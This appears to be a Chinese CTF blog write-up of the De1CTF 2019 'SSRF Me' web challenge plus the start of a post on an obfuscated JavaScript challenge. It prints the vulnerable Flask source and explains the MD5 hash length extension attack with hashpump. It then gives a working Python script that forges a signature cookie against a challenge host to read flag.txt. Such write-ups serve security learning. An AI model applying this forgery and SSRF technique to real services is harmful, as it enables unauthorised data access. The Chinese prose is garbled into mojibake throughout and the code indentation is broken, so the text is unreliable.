class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line"></span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line"><span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">    <span class="keyword">if</span><span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">        tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> resp</span><br><span class="line"></span><br><span class="line">tmpfile.write(resp)</span><br><span class="line">tmpfile.close()</span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> <span class="keyword">else</span>:</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="keyword">if</span>(getSign(self.action, self.param) == self.sign):</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> <span class="keyword">return</span> <span class="literal">False</span>  <span class="comment"># generate Sign For Action Scan.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> action = <span class="string">&quot;scan&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> <span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"> <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line"> check = param.strip().lower()</span><br><span class="line"> <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.debug = <span class="literal">False</span></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿˜æ˜¯æŒºä¹±çš„â€¦â€¦èƒ½çœ‹æ‡‚å°±è¡Œâ€¦â€¦</p>
</blockquote>
<p>å…ˆçœ‹è·¯ç”±ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> â€»action = <span class="string">&quot;scan&quot;</span></span><br></pre></td></tr></table></figure>

<p>è°ƒç”¨äº†getSignï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œè®¿é—®/geneSignï¼Œä¼šæ ¹æ®secert_keyã€paramã€actionç”ŸæˆMD5çš„ç­¾å</p>
<p>actionçš„é»˜è®¤å€¼ä¸º<strong>scan</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> â€»<span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> â€»task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br></pre></td></tr></table></figure>

<p><strong>walfï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line"> check = param.strip().lower()</span><br><span class="line"> <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><strong>class taskå’ŒExecï¼š</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">    self.action = action</span><br><span class="line">    self.param = param</span><br><span class="line">    self.sign = sign</span><br><span class="line">    self.sandbox = md5(ip)</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">not</span> os.path.exists(self.sandbox)):  <span class="comment"># SandBox For Remote_Addr</span></span><br><span class="line">        os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">â€»<span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">    <span class="keyword">if</span><span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">        tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        resp = scan(self.param)</span><br><span class="line">    <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">        result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> resp</span><br><span class="line">tmpfile.write(resp)</span><br><span class="line">tmpfile.close()</span><br><span class="line">result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line"><span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">    result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span> <span class="keyword">else</span>:</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<p>åœ¨æ ¸å¯¹ç­¾ååï¼Œå¦‚æœscanåœ¨actionä¸­ï¼Œåˆ™scanè¯»å–paramå¹¶å­˜æ”¾åˆ°result.txtä¸­</p>
<p>å¦‚æœreadåœ¨actionä¸­ï¼Œåˆ™readè¯»å–å¹¶æ˜¾ç¤ºresult.txtâ€¦â€¦å¤§æ¦‚æ˜¯è¿™ä¸ªæ„æ€</p>
<p>æƒ³readå°±è¦ä¼ªé€ ç­¾åï¼Œè¿™é‡Œå­˜åœ¨ä¸€ç§æ”»å‡»æ–¹å¼ï¼š</p>
<h5 id="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"></a><strong>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</strong></h5><p>æƒ³è¦äº†è§£è¿™ç§æ”»å‡»æ–¹å¼ï¼Œå°±è¦äº†è§£å“ˆå¸Œï¼š</p>
<h6 id="1-HASH"><a href="#1-HASH" class="headerlink" title="1.HASH:"></a>1.HASH:</h6><p>Hashï¼Œä¸€èˆ¬ç¿»è¯‘åšæ•£åˆ—ã€æ‚å‡‘ï¼Œæˆ–éŸ³è¯‘ä¸ºå“ˆå¸Œï¼Œæ˜¯æŠŠä»»æ„é•¿åº¦çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BE%93%E5%85%A5/5481954">è¾“å…¥</a>ï¼ˆåˆå«åšé¢„æ˜ å°„pre-imageï¼‰é€šè¿‡æ•£åˆ—ç®—æ³•å˜æ¢æˆå›ºå®šé•¿åº¦çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BE%93%E5%87%BA/11056752">è¾“å‡º</a>ï¼Œè¯¥è¾“å‡ºå°±æ˜¯æ•£åˆ—å€¼ã€‚ç®€å•çš„è¯´å°±æ˜¯ä¸€ç§å°†ä»»æ„é•¿åº¦çš„æ¶ˆæ¯å‹ç¼©åˆ°æŸä¸€å›ºå®šé•¿åº¦çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E6%91%98%E8%A6%81/4547744">æ¶ˆæ¯æ‘˜è¦</a>çš„å‡½æ•°ã€‚åŸºäºMerkleâ€“DamgÃ¥rdç»“æ„ã€‚</p>
<h6 id="2-ä¾‹å¦‚ï¼šMD5"><a href="#2-ä¾‹å¦‚ï¼šMD5" class="headerlink" title="2.ä¾‹å¦‚ï¼šMD5"></a>2.ä¾‹å¦‚ï¼šMD5</h6><p>ä¸€èˆ¬md5åœ¨ç­¾åæ—¶ä¼šæ˜¯è¿™æ ·çš„ï¼š</p>
<p><strong>md5ï¼ˆkey+dataï¼‰</strong></p>
<p>æˆ‘ä»¬ä¸çŸ¥é“keyï¼Œä½†æ˜¯dataæ˜¯å¯ä»¥æ§åˆ¶çš„</p>
<p>å¦‚æœåŒæ—¶æˆ‘ä»¬çŸ¥é“äº†keyçš„é•¿åº¦å°±å¯ä»¥<strong>æ— éœ€key</strong>ï¼Œè®¡ç®—å‡º<strong>md5ï¼ˆkey+data+attachï¼‰</strong></p>
<p><strong>attach</strong>å°±æ˜¯æˆ‘ä»¬ä»»æ„é™„åŠ çš„å­—æ®µã€‚</p>
<p><strong>md5åœ¨åŠ å¯†æ—¶ï¼ŒdataæŒ‰ç…§512ä½åˆ†å—å¤„ç†ï¼Œæœ€åä¸€å—ä¸æ»¡512ä½çš„å¤„ç†ï¼š</strong></p>
<ol>
<li>data+padding+length(data)ï¼šæ€»é•¿åº¦ä¸º64å­—èŠ‚ï¼›</li>
<li>length(data)ï¼š8å­—èŠ‚ï¼Œ64ä½é•¿ï¼Œæè¿°dataåŸå§‹ä¿¡æ¯çš„é•¿åº¦ï¼ŒæŒ‰ç…§å°ç«¯å‚¨å­˜ï¼›</li>
<li>paddingï¼šå¡«å……ï¼Œæ ¹æ®â€œ\80â€+(â€œ\x00â€)*x,ä½¿å¾—è¾¾åˆ°448ä½é•¿åº¦ã€‚</li>
</ol>
<p>è¿™æ ·ï¼Œæ•°æ®å°±å¯ä»¥<strong>åˆ†å—è®¡ç®—</strong>äº†ã€‚</p>
<p>MD5è§„å®šäº†æœ‰<strong>åˆå§‹è®¡ç®—å‘é‡</strong>ï¼Œå‘é‡ä¾æ¬¡ä¸æ¯ä¸ªæ•°æ®å—è®¡ç®—ï¼Œæ¯è®¡ç®—ä¸€æ¬¡ï¼Œå¾—åˆ°<strong>æ–°çš„å‘é‡</strong>ã€‚</p>
<p>æ–°çš„å‘é‡ä¼š<strong>è¦†ç›–</strong>æ‰åˆå§‹å‘é‡ï¼Œæˆä¸ºä¸‹ä¸ªæ•°æ®å—çš„è®¡ç®—å‘é‡ã€‚æœ€åçš„è®¡ç®—å‘é‡å¤„ç†åå°±æ˜¯<strong>æœ€ç»ˆçš„md5å€¼</strong>ã€‚</p>
<p>è€Œæˆ‘ä»¬<strong>å·²çŸ¥</strong>çš„md5(key+data)å°±ç›¸å½“äºå·²çŸ¥<strong>å‰ä¸€ä¸ªæ•°æ®å—è®¡ç®—åå¾—åˆ°çš„è®¡ç®—å‘é‡</strong>ã€‚</p>
<p>åœ¨<strong>keyé•¿åº¦å·²çŸ¥çš„æƒ…å†µä¸‹</strong>ï¼Œæˆ‘ä»¬åªè¦<strong>äººä¸ºè¡¥å……padding</strong>ï¼Œå°±å¯ä»¥ä½¿<strong>attach</strong>æˆä¸ºä¸‹ä¸€ä¸ªæ•°æ®å—å†…å®¹ï¼Œ</p>
<p>åœ¨<strong>keyå‚ä¸ä¸‹</strong>è®¡ç®—çš„å‘é‡ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œä¹Ÿå°±ç¡®ä¿æ‹¿<strong>å·²çŸ¥md5</strong>ç»§ç»­è®¡ç®—ä¸‹å»å¾—åˆ°çš„md5æ˜¯æ­£ç¡®çš„ã€‚</p>
<p>æˆ‘ä»¬æ‹¿åˆ°md5å€¼åï¼Œå°±å¯ä»¥å®ŒæˆéªŒè¯ï¼Œå®Œæˆ<strong>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</strong>æ”»å‡»äº†ã€‚</p>
<h5 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h5><p>emâ€¦â€¦è¿™ä¸ªæœ¬åœ°å®ç°è¿˜æŒºéš¾æçš„â€¦â€¦ï¼Œhashpumpå·¥å…·å¯ä»¥è½»æ¾å®Œæˆè¿™äº›å·¥ä½œğŸ•ï¼</p>
<p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321105703270.png" alt="image-20210321105703270"></p>
<p>ä½¿ç”¨ä¹Ÿååˆ†ç®€ä»‹æ˜äº†ï¼Œå·²çŸ¥md5ï¼Œdataï¼Œkeyçš„é•¿åº¦ï¼Œé™„åŠ å­—æ®µï¼Œå°±å¯ä»¥ç”Ÿæˆå¯¹åº”md5å’Œå¡«å……å¥½çš„æ•°æ®</p>
<h5 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h5><p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321110037572.png" alt="image-20210321110037572"></p>
<p>å¯ä»¥çœ‹åˆ°keyçš„é•¿åº¦ï¼ŒåŒæ—¶æ ¹æ®hintï¼Œparamä¸ºflag.txtï¼Œå…±24ä½ã€‚attachè‡ªç„¶æ˜¯read</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> <span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br></pre></td></tr></table></figure>

<p>å‘/De1taé¡µé¢çš„cookieå­—æ®µæäº¤signå’Œactionå³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://9c8d9029-c3f0-495e-a6b1-d806896df4a2.node3.buuoj.cn/De1ta?param=flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##å°†ç”Ÿæˆ\xè½¬æ¢æˆ%</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">  <span class="string">&#x27;sign&#x27;</span>: <span class="string">&#x27;2b865fed1aca31784de5754a868533a3&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321110421364.png" alt="image-20210321110421364"></p>
<p>ok</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/NaNNaNNaNNaN-Batman/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/NaNNaNNaNNaN-Batman/" class="post-title-link" itemprop="url">NaNNaNNaNNaN-Batman</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-18 16:54:41 / ä¿®æ”¹æ—¶é—´ï¼š17:52:18" itemprop="dateCreated datePublished" datetime="2021-03-18T16:54:41+08:00">2021-03-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h4><p>é¢˜ç›®åªæœ‰ä¸€ä¸ªé™„ä»¶ï¼šweb100â€¦â€¦</p>
<p>æ‰“å¼€åæ˜¯ä¹±ç ï¼š</p>
<p><img src="D:\HexoBlog\source\images\NaNNaNNaNNaN-Batman\image-20210318165620867.png" alt="image-20210318165620867"></p>
<p><code>_</code>æ˜¯ä¸€ä¸ªfunctionï¼Œåé¢å¯ä»¥çœ‹åˆ°evalï¼ˆ_ï¼‰â€¦â€¦</p>
<p>åœ¨jsä¸­ï¼Œevalæ˜¯ä¸€ä¸ªå¥‡æ€ªçš„å‡½æ•°ï¼š</p>
<blockquote>
<p><strong>JavaScript eval() å‡½æ•°</strong></p>
<p>eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚</p>
</blockquote>
<p>â€¦â€¦æ€»ä¹‹å°±æŒºå¥‡æ€ªçš„ï¼Œè®¡ç®—å‡ºä¹±ç â€¦â€¦ï¼Œæˆ‘æ‰¾åˆ°äº†GitHubä¸Šçš„å®˜æ–¹wpï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To see what code gets evaluated, <span class="keyword">let</span>â€™s replace theevalat the end withconsole.log. This results <span class="keyword">in</span>:</span><br><span class="line"></span><br><span class="line">_ = <span class="string">&#x27;function $()&#123;\x02e=\x04getEle\x0FById(&quot;c&quot;).value;\x0Elength==16\x05^be0f23\x01233ac\x01e98aa$\x01c7be9\x07)&#123;\x02t\bfl\x03s_a\x03i\x03e&#125;\x06n\ba\x03_h0l\x03n\x06r\bg&#123;\x03e\x03_0\x06i\bit\&#x27;\x03_\x03n\x06s=[t,n,r,i];for(\x02o=0;o&lt;13;++o)&#123;\t\x0B[0]);\x0B.splice(0,1)&#125;&#125;&#125;\t\&#x27;&lt;input id=&quot;c&quot;&gt;&lt;\f onclick=$()&gt;Ok&lt;/\f&gt;\&#x27;);delete _\x01\x07\x05\x02var \x03&quot;,&quot;\x04docu\x0F.\x05)\x0Ematch(/\x06&quot;];\x02\x07/)!=null\b=[&quot;\t\x04write(\x0Bs[o%4]\fbutton\x0Eif(e.\x0Fment&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (Y <span class="keyword">in</span> $ = <span class="string">&#x27;\x0F\x0E\f\x0B\t\b\x07\x06\x05\x04\x03\x02\x01&#x27;</span>)</span><br><span class="line">  <span class="keyword">with</span> (_.split($[Y]))</span><br><span class="line">    _ = join(pop());</span><br><span class="line"><span class="built_in">eval</span>(_);</span><br></pre></td></tr></table></figure>

<p>\xæ˜¯ä»¥16è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦â€¦â€¦jsä¸æ˜¯å¾ˆç†Ÿæ‚‰</p>
<p>æŠŠä¸å¯é¢„æµ‹çš„evalæ¢æˆalertæ­£ç¡®è§£é‡Šï¼š</p>
